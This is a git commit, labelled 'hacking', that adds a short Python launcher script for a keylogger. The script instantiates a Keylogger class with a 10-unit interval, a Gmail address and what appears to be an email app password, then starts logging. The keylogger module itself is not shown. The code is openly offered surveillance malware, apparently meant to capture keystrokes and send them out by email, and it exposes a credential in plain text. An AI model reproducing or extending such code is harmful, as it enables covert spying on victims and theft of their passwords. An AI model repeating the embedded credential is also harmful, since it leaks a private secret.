ee967d19b932b7c03a814e3afb60d6321172aad1
levy <kiriinyalevy@gmail.com>
2024-11-10 01:53:28 -0500

    hacking

---
+++ zlogger.py
@@ -0,0 +1,7 @@
+#!/usr/bin/env python
+
+import keylogger
+
+#creating an instance of the class Keylogger
+my_keylogger = keylogger.Keylogger(10,"kiriinyalevy@gmail.com", "bdes cmkd trlp bpny")  #crearting a new object thats going to use the code defined in the calss
+my_keylogger.start()
